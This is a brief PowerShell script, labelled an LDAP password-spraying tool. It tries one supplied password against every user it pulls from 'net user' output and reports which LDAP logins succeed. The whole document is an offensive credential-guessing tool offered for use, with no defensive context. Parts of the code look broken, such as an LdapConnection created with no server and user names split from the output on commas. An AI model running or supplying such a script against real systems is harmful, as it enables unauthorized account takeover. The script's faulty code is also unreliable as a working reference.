## LDAP Password Spraying Script in Powershell

# Set Domain and Password
$domain = "example.com"
$password = $args[0]

# Get User List
$users = (net user $domain | Select-String -Pattern "\w+\s+\w+" | Out-String).Split(",")

# Iterate User List
foreach ($user in $users) {
  
  # Output User
  Write-Host "Trying ldap://$domain/$user"
  
  # Try Ldap with User and Password
  Try {
    $auth = New-Object System.DirectoryServices.Protocols.LdapConnection
    $auth.Credential = New-Object System.Net.NetworkCredential($user, $password)
    $auth.AuthType = 3;
    $auth.sessionOptions.SecureSocketLayer = $True
    $auth.SessionOptions.VerifyServerCertificate = $True;
    $auth.Bind()
    Write-Host "$user authentication successful"
   
    # Disconnect
    $auth.Dispose()
  }
  Catch {
    Write-Host "$user authentication failed"
  }

}